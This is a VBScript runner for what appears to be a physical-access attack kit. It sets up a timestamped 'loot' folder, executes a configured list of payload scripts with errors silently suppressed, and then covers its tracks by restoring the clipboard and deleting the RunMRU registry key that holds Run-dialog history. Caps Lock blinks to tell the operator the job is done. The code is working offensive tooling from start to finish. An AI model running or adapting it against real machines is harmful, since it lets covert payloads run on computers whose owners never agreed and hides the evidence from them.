' Define global variables.
PATH_ROOT = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\lib\run.vbs"))
PATH_LOOT = PATH_ROOT & "loot\" & Replace(FormatDateTime(Date()), "/", "-") & "_" & Replace(FormatDateTime(Time(), 4), ":", "-") & "-" & Second(Now()) & "\"
CLIP = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")

' Subroutine to include files.
Sub Execute(path)
	Set file = CreateObject("Scripting.FileSystemObject").OpenTextFile(PATH_ROOT & path , 1)
	contents = file.ReadAll
	file.Close
	
	ExecuteGlobal(contents)
End Sub

' Define local variables.
timeStart = (Minute(Now) * 60) + Second(Now())

' Include files.
Execute("lib\includes\log.vbs")
Execute("lib\includes\config.vbs")

' Prepare the exploit.
CreateObject("Scripting.FileSystemObject").CreateFolder PATH_LOOT
Log "START", "The exploit has now been started and running."

' Check for developer mode.
If cfgDict("DEV") = "true" Then
	On Error Goto 0
	Log "INFO", "The exploit is running in developer mode."
Else
	On Error Resume Next
End IF

' Run the payloads.
payloadFiles = Split(cfgDict("PAYLOAD"), ",")
For i = 0 to UBound(payloadFiles)
	Execute(payloadFiles(i))
Next

' Hault the exploit.
WScript.CreateObject("WScript.Shell").Run "cmd.exe /C echo " & CLIP & " | clip", 0, True
WScript.CreateObject("WScript.Shell").Run "cmd.exe /C reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /F", 0, True
timeEnd = (Minute(Now) * 60) + Second(Now())
Log "STOP", "The exploit has completed. Time: " & timeEnd - timeStart & " seconds"

' Signal the exploit is complete.
For i = 0 To 5
	CreateObject("WScript.Shell").SendKeys "{CAPSLOCK}"
	WScript.Sleep 300
Next

If cfgDict("DEV") = "true" Then WScript.Echo("Exploit complete.") End If
WScript.Quit
